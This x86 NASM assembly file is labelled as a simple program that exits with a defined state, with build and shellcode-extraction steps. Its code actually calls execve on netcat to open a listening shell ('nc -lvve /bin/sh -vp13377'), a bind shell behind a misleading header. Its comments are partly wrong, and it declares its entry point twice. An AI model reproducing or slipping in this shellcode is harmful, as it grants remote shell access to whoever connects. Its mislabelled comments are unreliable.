; # Simple Programm to exit
; # with a defined state
; #
; # Compile using nasm:
; # nasm -f elf32 exit.asm
; # ld -m elf_i386 -o exiter exit.o 
; #
; # Generate Shellcode using Hexdump
; # objdump -d exiter
; ##################################

global _start			;  define entry point

section .text			; begin of .text section
_start:					; entry point
   section .text
    global _start

_start:
    xor ebx, ebx            ; Clear EBX (set to 0)
    pop eax                 ; Set EAX to 0x00
    int 0x80                ; Execute syscall (null operation for clearing registers)

    xor eax, eax            ; Clear EAX
    xor edx, edx            ; Clear EDX

    push 0x37373333         ; Push "3377" onto the stack
    push 0x3170762d         ; Push "-vp1" onto the stack
    mov edx, esp            ; Move pointer to "-vp13377" into EDX
    push eax                ; Push NULL terminator

    push 0x68732f6e         ; Push "n/sh" onto the stack
    push 0x69622f65         ; Push "e/bi" onto the stack
    push 0x76766c2d         ; Push "-lvv" onto the stack
    mov ecx, esp            ; Move pointer to "-lvve/bin/sh" into ECX
    push eax                ; Push NULL terminator

    push 0x636e2f2f         ; Push "//nc" onto the stack
    push 0x2f2f2f2f         ; Push "////" onto the stack
    push 0x6e69622f         ; Push "/bin" onto the stack
    mov ebx, esp            ; Move pointer to "/bin////nc" into EBX
    push eax                ; Push NULL terminator

    push edx                ; Push pointer to "-vp13377" argument
    push ecx                ; Push pointer to "-lvve/bin/sh" argument
    push ebx                ; Push pointer to "/bin////nc" argument

    xor edx, edx            ; Clear EDX (set it to NULL)
    mov ecx, esp            ; Point ECX to the argument array
    mov al, 0x0b            ; Set AL to 0xb (execve syscall)
    int 0x80                ; Trigger syscall


; end of exit.asm
